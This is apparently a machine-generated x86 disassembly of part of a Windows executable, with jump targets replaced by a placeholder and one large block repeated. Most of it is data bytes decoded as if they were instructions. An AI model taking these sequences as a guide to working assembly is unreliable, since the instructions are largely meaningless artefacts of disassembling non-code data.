inc esp
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 8 + 0x1c ] si
inc eax
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
jne r-xdata
jns r-xdata
add [ edx ] al
add [ eax + r-xdata ] dl
or eax 0x61565413
jb r-xdata
popad
jns r-xdata
outsd
jne r-xdata
jo r-xdata
je r-xdata
push esi
popad
je r-xdata
jns r-xdata
outsd
jne r-xdata
popad
jb r-xdata
add [ ecx + ecx ] dl
push eax
push esi
popad
jns r-xdata
jb r-xdata
pop ds
inc eax
add [ edx ] al
add [ ebp + 0x1f040040 ] cl
inc eax
add [ esi ] cl
or [ esi + edx * 2 + 0x61 ] edx
add cl [ eax ]
inc esp
imul ebp [ ebp + 0x43 ] 0x746e756f
add al [ eax ]
int3
jb r-xdata
add al [ fs : eax ]
add al [ eax ]
nop
rcr [ esi ] 0x40
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add cl [ eax * 2 + 0x656d656c ]
outsb
je r-xdata
add [ esi ] cl
push cs
push esp
push esi
popad
jb r-xdata
inc eax
popad
insd
add [ eax ] al
add [ eax ] eax
jb r-xdata
popad
je r-xdata
adc [ eax ] al
add ah cl
insd
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
inc ecx
jb r-xdata
insb
insd
outsb
je r-xdata
jb r-xdata
insb
popad
popad
add al [ eax ]
add [ eax ] al
add al [ 0x67616c46 ]
jae r-xdata
jb r-xdata
add [ 0x61565413 ] cl
inc eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
in al dx
push ds
inc eax
outsd
jne r-xdata
jb r-xdata
xor al [ fs : edx ]
add ah cl
adc [ eax ] al
push es
add [ eax ] al
add [ edx ] al
or [ edx + 0x65 ] edx
jae r-xdata
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
push ebx
adc [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ ebx ]
inc ebp
add [ eax + edx + 0x40040 ] bl
add al 0x0
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] bl
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ 0x70795456 ]
add al [ gs : eax ]
int3
imul edi [ edx + 0x65 ] 0x109c0002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ edi + ebp * 2 + 0x63 ] ecx
imul eax [ ebx + 0x6f ] 0x75
outsb
inc eax
add [ eax ] dl
popad
outsd
jne r-xdata
popad
jb r-xdata
or [ eax + 0x56 ] edx
or [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
je r-xdata
imul ebp [ esi + 0x6f ] 0x77
outsb
add al [ eax ]
adc [ fs : eax ] al
outsb
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
dec ecx
outsb
je r-xdata
add [ eax + edx + 0x80040 ] bl
push ds
inc eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebx + 0x40 ] ch
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esp + eax * 2 ]
popad
je r-xdata
add ah ah
jbe r-xdata
jae r-xdata
add [ eax + eax ] al
add [ eax ] al
add cl [ ecx ]
push edx
jae r-xdata
je r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax + edx + 0x40040 ] bl
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ 0x74794256 ]
add [ eax + edx + 0x80040 ] dh
jns r-xdata
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x44 ] edx
je r-xdata
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
xor eax [ fs : edx ]
imul esi [ ebx + 0x70 ] 0x68637461
add al [ eax ]
pushfd
adc al [ eax ]
or [ eax ] al
add [ eax ] al
add al [ esi ]
push esi
inc ebp
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
inc esp
jb r-xdata
add [ edx ] al
or [ edx + 0x65 ] edx
jae r-xdata
add [ eax ] al
add [ edx ] al
push es
inc edx
outsd
jne r-xdata
add al [ eax ]
mov esp 0x1000401e
jns r-xdata
add [ eax + 0x8004010 ] al
add [ eax ] al
add [ edx ] al
or [ esi + 0x53 ] edx
xor eax [ fs : edx ]
jb r-xdata
add [ ebp + 0x1f980040 ] cl
inc eax
add [ esi ] cl
or [ esi + edx * 2 + 0x61 ] dl
add [ edx ] al
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
push esi
inc ecx
jb r-xdata
add al [ gs : eax ]
int3
push edi
outsd
jb r-xdata
outsd
jb r-xdata
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
push ebx
push 0x4974726f
outsb
je r-xdata
adc [ eax ] al
enter 0x4011 0x0
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
dec edi
insb
push ebx
je r-xdata
add al [ eax ]
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
push ebx
imul ebp [ esi + 0x67 ] 0x2656c
js r-xdata
add [ ecx + edx + 0x40 ] dl
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add eax 0x74614456
add al [ gs : eax ]
push ds
add [ eax + 0x1e ] bl
add al [ eax ]
loopne r-xdata
insb
add al [ gs : eax ]
popad
popad
jns r-xdata
add cl [ eax ]
push esi
push eax
add al [ eax ]
adc al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
push esi
dec ecx
outsb
je r-xdata
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
inc edx
add al ah
mov [ ecx ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x43 ] edx
jne r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
push esi
inc esp
outsd
outsb
add ah ah
outsd
outsd
insb
popad
outsb
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x55 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x42 ] dl
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add ah ah
add al [ eax ]
nop
sbb [ edx ] ah
inc eax
add [ edx + ecx ] dl
push eax
push esp
jns r-xdata
imul ebp [ esi + 0x67 ] 0x2
add [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
push esi
dec esp
outsd
outsb
jae r-xdata
jns r-xdata
xor al 0x2
add [ ecx + edx ] dh
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
push esi
push ebp
dec ecx
outsb
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
push ebp
arpl [ ecx + 0x2 ] di
outsb
push esp
push esp
popad
bound ebp [ ebp - 0x10 ]
and [ eax ] eax
add al [ eax ]
mov eax eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
push es
push esi
push edi
outsd
jb r-xdata
add [ eax ] al
push ds
inc eax
add al ch
outsd
imul ebp [ esi + 0x74 ] 0x27265
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x55 ] dl
push ebx
je r-xdata
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x50 ] dl
xor al 0x2
add ah ah
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
push ebx
je r-xdata
push edx
jae r-xdata
sbb al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah al
and al [ eax ]
add [ eax + eax ] cl
add [ eax ] al
add cl [ ecx ]
push ebp
outsb
imul esi [ esi + ecx * 2 + 0x61 ] 0x273656d
add [ edx ] al
add [ ebp + 0x22c80040 ] cl
inc eax
add [ edx + ecx ] dl
push eax
dec esp
dec ecx
outsb
outsw
dec eax
and al [ eax ]
add al [ eax ]
dec esp
and al [ eax ]
add [ eax + edx ] dl
push eax
push eax
popad
arpl [ ebx + 0x61 ] bp
push esp
jns r-xdata
add [ ebx + 0x402230c0 ] cl
jae r-xdata
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x10e40002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add al 0x56
inc ecx
outsb
and eax [ eax ]
add al [ eax ]
lea eax [ eax ]
mov al 0x23
inc eax
add [ esi ] cl
or eax 0x73655254
push ebx
je r-xdata
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] al
add [ edx ] al
or [ edx + 0x65 ] dl
jae r-xdata
add al [ eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
dec ecx
outsb
jae r-xdata
imul esp [ edx + 0x4d ] 0x6c75646f
fsub [ gs : edx ]
inc eax
add [ edx ] al
add [ ebx + 0x4022e0c0 ] cl
add [ esi ] cl
or dl [ esp + ecx * 2 + 0x69 ]
bound ecx [ ebp + 0x6f ]
or dl [ eax + 0x4c ]
dec ecx
outsb
outsw
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
pushfd
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esp
jns r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
push es
push esi
inc edx
jns r-xdata
adc [ eax + edx * 2 + 0x61 ] dl
arpl [ ebx + 0x61 ] bp
push esp
jns r-xdata
inc eax
add [ esi ] cl
jae r-xdata
pop edx
dec ebx
add [ ebx + 0x7c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7025ffc0 ] cl
pop edx
imul ebp [ esi + 0x67 ] 0x8636552
add [ eax ] al
add al [ esi ]
dec ebp
outsd
jne r-xdata
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] ch
inc eax
add [ eax + eax ] dl
add [ eax ] al
add cl [ eax ]
push esp
jns r-xdata
outsb
jb r-xdata
add [ edx ] al
add [ ebx + 0x402394c0 ] cl
add [ ecx + 0x73655250 ] dl
push ebx
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ ebx + eax * 2 ]
outsd
dec ecx
outsb
jae r-xdata
jne r-xdata
inc ebx
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
pop es
push edx
popad
ja r-xdata
add [ eax ] al
sar bh 0x25
jo r-xdata
je r-xdata
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ edx ]
dec ecx
outsb
add [ eax + eax ] al
dec ecx
outsb
outsw
add al [ eax ]
pushfd
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add cl [ eax ]
push edx
jae r-xdata
dec ebx
add [ ebx + 0x6025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5025ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x47da0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4025ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x4bda0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x3c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0xc25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x825ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x4fda0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x25ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x3da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x57da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x5bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x5fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x7da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0xbda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x67da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x6bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x6fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0xfda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x13da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x17da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x1bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x1fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add bh al
add al 0x24
inc esp
add [ eax ] al
add [ eax + ebp * 8 + 0x42 ] dl
sar bh 0x25
push 0x8b004b5a
sar bh 0x25
pop edx
imul sp [ ebp + 0x72 ] 0x2
add al [ eax ]
mov eax eax
[ edx ] eax
inc eax
retn
add al [ fs : eax ]
add al [ eax ]
mov eax eax
xchg esp eax
and eax [ eax ]
adc al 0xd
push eax
push edx
jae r-xdata
retn
imul ebp [ esi + 0x67 ] 0xac636552
lodsb [ esi ]
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ esp + eax * 2 ]
popad
je r-xdata
je r-xdata
xor [ edx ] ah
inc eax
popad
je r-xdata
mov eax eax
dec ebx
add [ ebx + 0x6c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x6825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x6425ffc0 ] cl
pop edx
je r-xdata
dec ecx
outsb
jae r-xdata
and al [ eax ]
add al 0x0
add [ eax ] al
add cl [ ecx ]
push esp
jns r-xdata
add [ edx ] dl
inc eax
add [ eax + eax ] al
push cs
add al [ eax ]
add al [ eax ]
nop
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
arpl [ gs : eax ] cx
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ ebx ]
add [ eax ] al
add [ eax ] al
add al [ esi + ecx * 2 ]
js r-xdata
popad
bound ebp [ ebp + 0x2 ]
add [ eax + edx + 0x80040 ] bl
add [ eax ] al
add cl [ ecx ]
push ebp
outsb
imul esi [ ebx + eax * 2 + 0x6f ] 0x2746e75
add [ esi + ebx ] ch
inc eax
push esp
sub_401c78
pop ecx
sbb al 0x40
add [ ebx + 0x1c ] ah
inc eax
add [ ebp + 0x1c ] ch
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
js r-xdata
inc eax
add ah bh
sbb al 0x40
add [ ecx ] bl
sbb eax 0x40
add [ eax ] al
xor eax 0x1000401d
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 + 0x55e00040 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ecx ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
or [ esi + 0x52 ] eax
inc bx
outsd
jne r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb al 0x40
add [ esp + ebx + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ 0x1cfc0040 ]
inc eax
inc esp
jae r-xdata
je r-xdata
add [ ecx ] al
add [ edx ] al
or [ esi ] ebx
jb r-xdata
add [ ebx ] al
add [ edi + 0x1d ] al
inc eax
add [ edx ] cl
stc
add [ eax ] al
inc eax
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x40040 ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add cl [ ecx ]
push ds
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
aam 0x1d
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub eax [ eax ]
push eax
popfd
inc eax
add [ ebx ] cl
dec esi
ja r-xdata
outsb
jae r-xdata
je r-xdata
popad
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
sbb al 0x40
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
fcomp [ 0x11070040 ]
push esp
dec ecx
outsb
je r-xdata
or [ esp + eax * 2 + 0x61 ] edx
push ds
inc eax
add [ esp + ecx ] dl
push eax
push ebx
push 0x5374726f
je r-xdata
je r-xdata
dec eax
push ds
inc eax
jb r-xdata
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x8b000201
shl [ eax + 0x1e ] 0x40
add cl [ eax ]
dec esp
outsd
ja r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add al [ eax ]
add [ eax + ecx ] dl
push eax
dec esp
outsd
outsb
imul ebp [ bp + 0x74 ] r-xdata
add al [ eax ]
pop esp
push ds
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 8 + 0x1c ] si
inc eax
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
jne r-xdata
jns r-xdata
add [ edx ] al
add [ eax + r-xdata ] dl
or eax 0x61565413
jb r-xdata
popad
jns r-xdata
outsd
jne r-xdata
jo r-xdata
je r-xdata
push esi
popad
je r-xdata
jns r-xdata
outsd
jne r-xdata
popad
jb r-xdata
add [ ecx + ecx ] dl
push eax
push esi
popad
jns r-xdata
jb r-xdata
pop ds
inc eax
add [ edx ] al
add [ ebp + 0x1f040040 ] cl
inc eax
add [ esi ] cl
or [ esi + edx * 2 + 0x61 ] edx
add cl [ eax ]
inc esp
imul ebp [ ebp + 0x43 ] 0x746e756f
add al [ eax ]
int3
jb r-xdata
add al [ fs : eax ]
add al [ eax ]
nop
rcr [ esi ] 0x40
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add cl [ eax * 2 + 0x656d656c ]
outsb
je r-xdata
add [ esi ] cl
push cs
push esp
push esi
popad
jb r-xdata
inc eax
popad
insd
add [ eax ] al
add [ eax ] eax
jb r-xdata
popad
je r-xdata
adc [ eax ] al
add ah cl
insd
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
inc ecx
jb r-xdata
insb
insd
outsb
je r-xdata
jb r-xdata
insb
popad
popad
add al [ eax ]
add [ eax ] al
add al [ 0x67616c46 ]
jae r-xdata
jb r-xdata
add [ 0x61565413 ] cl
inc eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
in al dx
push ds
inc eax
outsd
jne r-xdata
jb r-xdata
xor al [ fs : edx ]
add ah cl
adc [ eax ] al
push es
add [ eax ] al
add [ edx ] al
or [ edx + 0x65 ] edx
jae r-xdata
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
push ebx
adc [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ ebx ]
inc ebp
add [ eax + edx + 0x40040 ] bl
add al 0x0
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] bl
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ 0x70795456 ]
add al [ gs : eax ]
int3
imul edi [ edx + 0x65 ] 0x109c0002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ edi + ebp * 2 + 0x63 ] ecx
imul eax [ ebx + 0x6f ] 0x75
outsb
inc eax
add [ eax ] dl
popad
outsd
jne r-xdata
popad
jb r-xdata
or [ eax + 0x56 ] edx
or [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
je r-xdata
imul ebp [ esi + 0x6f ] 0x77
outsb
add al [ eax ]
adc [ fs : eax ] al
outsb
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
dec ecx
outsb
je r-xdata
add [ eax + edx + 0x80040 ] bl
push ds
inc eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebx + 0x40 ] ch
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esp + eax * 2 ]
popad
je r-xdata
add ah ah
jbe r-xdata
jae r-xdata
add [ eax + eax ] al
add [ eax ] al
add cl [ ecx ]
push edx
jae r-xdata
je r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax + edx + 0x40040 ] bl
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ 0x74794256 ]
add [ eax + edx + 0x80040 ] dh
jns r-xdata
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x44 ] edx
je r-xdata
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
xor eax [ fs : edx ]
imul esi [ ebx + 0x70 ] 0x68637461
add al [ eax ]
pushfd
adc al [ eax ]
or [ eax ] al
add [ eax ] al
add al [ esi ]
push esi
inc ebp
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
inc esp
jb r-xdata
add [ edx ] al
or [ edx + 0x65 ] edx
jae r-xdata
add [ eax ] al
add [ edx ] al
push es
inc edx
outsd
jne r-xdata
add al [ eax ]
mov esp 0x1000401e
jns r-xdata
add [ eax + 0x8004010 ] al
add [ eax ] al
add [ edx ] al
or [ esi + 0x53 ] edx
xor eax [ fs : edx ]
jb r-xdata
add [ ebp + 0x1f980040 ] cl
inc eax
add [ esi ] cl
or [ esi + edx * 2 + 0x61 ] dl
add [ edx ] al
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
push esi
inc ecx
jb r-xdata
add al [ gs : eax ]
int3
push edi
outsd
jb r-xdata
outsd
jb r-xdata
or [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esi
push ebx
push 0x4974726f
outsb
je r-xdata
adc [ eax ] al
enter 0x4011 0x0
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
dec edi
insb
push ebx
je r-xdata
add al [ eax ]
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
push ebx
imul ebp [ esi + 0x67 ] 0x2656c
js r-xdata
add [ ecx + edx + 0x40 ] dl
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add eax 0x74614456
add al [ gs : eax ]
push ds
add [ eax + 0x1e ] bl
add al [ eax ]
loopne r-xdata
insb
add al [ gs : eax ]
popad
popad
jns r-xdata
add cl [ eax ]
push esi
push eax
add al [ eax ]
adc al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
push esi
dec ecx
outsb
je r-xdata
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
inc edx
add al ah
mov [ ecx ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x43 ] edx
jne r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
push esi
inc esp
outsd
outsb
add ah ah
outsd
outsd
insb
popad
outsb
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x55 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x42 ] dl
jb r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add ah ah
add al [ eax ]
nop
sbb [ edx ] ah
inc eax
add [ edx + ecx ] dl
push eax
push esp
jns r-xdata
imul ebp [ esi + 0x67 ] 0x2
add [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
push esi
dec esp
outsd
outsb
jae r-xdata
jns r-xdata
xor al 0x2
add [ ecx + edx ] dh
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
pop es
push esi
push ebp
dec ecx
outsb
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ eax ]
push esi
push ebp
arpl [ ecx + 0x2 ] di
outsb
push esp
push esp
popad
bound ebp [ ebp - 0x10 ]
and [ eax ] eax
add al [ eax ]
mov eax eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
push es
push esi
push edi
outsd
jb r-xdata
add [ eax ] al
push ds
inc eax
add al ch
outsd
imul ebp [ esi + 0x74 ] 0x27265
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x55 ] dl
push ebx
je r-xdata
add al [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ esi + 0x50 ] dl
xor al 0x2
add ah ah
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ edi ]
push esi
push ebx
je r-xdata
push edx
jae r-xdata
sbb al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah al
and al [ eax ]
add [ eax + eax ] cl
add [ eax ] al
add cl [ ecx ]
push ebp
outsb
imul esi [ esi + ecx * 2 + 0x61 ] 0x273656d
add [ edx ] al
add [ ebp + 0x22c80040 ] cl
inc eax
add [ edx + ecx ] dl
push eax
dec esp
dec ecx
outsb
outsw
dec eax
and al [ eax ]
add al [ eax ]
dec esp
and al [ eax ]
add [ eax + edx ] dl
push eax
push eax
popad
arpl [ ebx + 0x61 ] bp
push esp
jns r-xdata
add [ ebx + 0x402230c0 ] cl
jae r-xdata
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x10e40002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add al 0x56
inc ecx
outsb
and eax [ eax ]
add al [ eax ]
lea eax [ eax ]
mov al 0x23
inc eax
add [ esi ] cl
or eax 0x73655254
push ebx
je r-xdata
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] al
add [ edx ] al
or [ edx + 0x65 ] dl
jae r-xdata
add al [ eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
dec ecx
outsb
jae r-xdata
imul esp [ edx + 0x4d ] 0x6c75646f
fsub [ gs : edx ]
inc eax
add [ edx ] al
add [ ebx + 0x4022e0c0 ] cl
add [ esi ] cl
or dl [ esp + ecx * 2 + 0x69 ]
bound ecx [ ebp + 0x6f ]
or dl [ eax + 0x4c ]
dec ecx
outsb
outsw
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
pushfd
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add cl [ ecx ]
push esp
jns r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
push es
push esi
inc edx
jns r-xdata
adc [ eax + edx * 2 + 0x61 ] dl
arpl [ ebx + 0x61 ] bp
push esp
jns r-xdata
inc eax
add [ esi ] cl
jae r-xdata
pop edx
dec ebx
add [ ebx + 0x7c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x7025ffc0 ] cl
pop edx
imul ebp [ esi + 0x67 ] 0x8636552
